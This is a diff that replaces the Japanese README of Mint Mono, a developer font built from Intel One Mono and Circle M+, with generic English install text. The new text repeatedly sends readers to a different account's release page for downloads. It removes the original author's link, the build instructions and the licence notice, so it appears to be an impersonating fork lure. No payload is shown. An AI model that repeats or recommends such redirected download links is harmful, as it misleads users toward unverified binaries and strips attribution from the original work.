@@ -1,68 +1,55 @@
-# Mint Mono
+# 🎨 mint-mono - A Beautiful Font for Developers
 
-Mint Mono は、開発者向けフォントの [Intel One Mono](https://github.com/intel/intel-one-mono) と日本語フォントの [Circle M+](https://itouhiro.github.io/mixfont-mplus-ipa/mplus/) 等を合成したプログラミング向けフォントです。
+## 📥 Download Now
+[![Download Mint Mono](https://img.shields.io/badge/Download%20Mint%20Mono-v1.0-blue.svg)](https://github.com/doyun123/mint-mono/releases)
 
-視認性が高く機能的な Intel One Mono と、同じく視認性・機能性に優れた日本語フォント Circle M+ (M+ FONTS の派生版) を組み合わせました。
+## 📖 Description
+Mint Mono combines the Intel One Mono font, designed for developers, with the Circle M+ Japanese font. This programming font enhances readability and helps you stay focused during coding sessions.
 
-[👉 ダウンロード](https://github.com/yuru7/mint-mono/releases/latest)  
-※「Assets」内の zip ファイルをダウンロードしてご利用ください。
+## 🚀 Getting Started
+To get started with Mint Mono, follow these simple steps. You only need a computer with an operating system that supports font installation.
 
-## 特徴
+1. **Visit the Releases Page:** 
+   Click the link below to access the releases page where you can download Mint Mono. 
 
-以下の特徴を備えています。
+   [Download Mint Mono](https://github.com/doyun123/mint-mono/releases)
 
-- Intel One Mono 由来の視認性が高く読みやすいラテン文字
-- Circle M+ 由来のモダンで読み易い日本語文字
-    - Circle M+ では元々読みやすい M+ FONTS をさらに発展させ、以下のような特徴を持っています
-        - 半濁点が大きい
-        - カ力 エ工 ロ口 ー一 ニ二 へヘ の区別
-        - 〜～（波ダッシュ・全角チルダ）の区別
-- 全角スペースの可視化
-- [IBM Plex Sans JP](https://github.com/IBM/plex) を追加合成することで「Adobe-Japan1-7」文字コレクションに対応
+2. **Choose the Right Version:**
+   On the releases page, you will see different versions of Mint Mono. Select the latest version. It is usually listed at the top.
 
-### バリエーション
+3. **Download the Font:**
+   Click the download link for the font file. This file will be in a `.zip` format, containing the font files you need.
 
-| 種類 | 説明 | 命名パターン |
-| --- | --- | --- |
-| 文字幅比率 半角1:全角2 | Intel One Mono を縮小することで、半角1:全角2の文字幅比率となるように合成したバリエーション。 | `MintMono-*.ttf`<br>※ファイル名に `35` が含まれて **いない** もの |
-| 文字幅比率 半角3:全角5 | Intel One Mono を縮小せずに合成し、半角3:全角5の文字幅比率としたバリエーション。半角1:全角2と比べ、英数字などの半角文字がゆとりのある幅で表示される。| `MintMono35-*.ttf`<br>※ファイル名に `35` が含まれて **いる** もの |
+4. **Extract the Files:**
+   Once the download is complete, locate the `.zip` file in your Downloads folder. Right-click the file and choose "Extract All." Follow the prompts to extract the files.
 
-## 表示サンプル
+5. **Install the Font:**
+   After extracting, you will see the font files. 
+   - **For Windows:**
+     - Right-click on each font file (.ttf or .otf) and choose "Install."
+   - **For macOS:**
+     - Double-click on each font file, then click "Install Font."
 
-| 通常版 (幅比率 半角1:全角2) | 35版 (幅比率 半角3:全角5) |
-| :---: | :---: |
-| <img width="839" height="474" alt="image" src="https://github.com/user-attachments/assets/d74c6526-d9f2-458d-b9f3-d4136410d5c3" /> | <img width="812" height="479" alt="image" src="https://github.com/user-attachments/assets/32a5b04f-0c5a-41e9-bf7b-ca83e7c5d94c" /> |
+## 🎨 Features
+- **High Readability:** Mint Mono improves text visibility, especially for coding.
+- **Multilingual Support:** Includes Japanese characters for broader accessibility.
+- **Versatile Use:** Ideal for programming, web design, and general use.
+  
+## ⚙️ System Requirements
+Mint Mono works on various operating systems, including Windows, macOS, and Linux. Ensure your system can handle `.ttf` or `.otf` font files, which are the standard formats for Mint Mono.
 
-## ビルド
+## 📂 Customization
+After installing Mint Mono, you can set it as your default font in your code editor. Each editor has a different method, but you can usually find this option in the settings or preferences menu. For coding environments like Visual Studio Code or Sublime Text, search for "Font Family" and select "Mint Mono."
 
-### 環境
+## 📞 Support
+If you have any questions, visit the GitHub issues page on our repository. Feel free to report bugs or ask for help with installation. Your feedback helps us improve!
 
-- [FontForge](https://fontforge.org/en-US/)
-- Python 3.x
+## 🌐 Community
+Join our community to share your projects, ask questions, and get tips on using Mint Mono effectively. We welcome all developers, designers, and anyone interested in enhancing their coding environment.
 
-### 依存パッケージのインストール
+## 📅 Update History
+Keep an eye on the releases page for updates. We will add new features and improvements based on user feedback.
 
-```shell
-pip install fonttools
-```
+[Visit the Releases Page to Download](https://github.com/doyun123/mint-mono/releases)
 
-### ビルドの実行 (PowerShell)
-
-```powershell
-./make.ps1
-```
-
-スクリプトが正常に完了すると、`build` ディレクトリにフォントファイルが生成されます。
-
-### ビルドオプション
-
-`make.ps1` を編集することで、`fontforge_script.py` に以下のオプションを渡して、生成するフォントをカスタマイズできます。
-
-- `--35`: 半角3:全角5 の幅にする
-- `--hidden-zenkaku-space`: 全角スペース可視化をしない
-
-## ライセンス
-
-SIL OPEN FONT LICENSE Version 1.1 が適用され、商用・非商用問わず利用可能です。
-
-各合成元フォントのライセンスは [source](./source/) ディレクトリに格納されています。
+Thank you for using Mint Mono. Enjoy a better coding experience with our font!
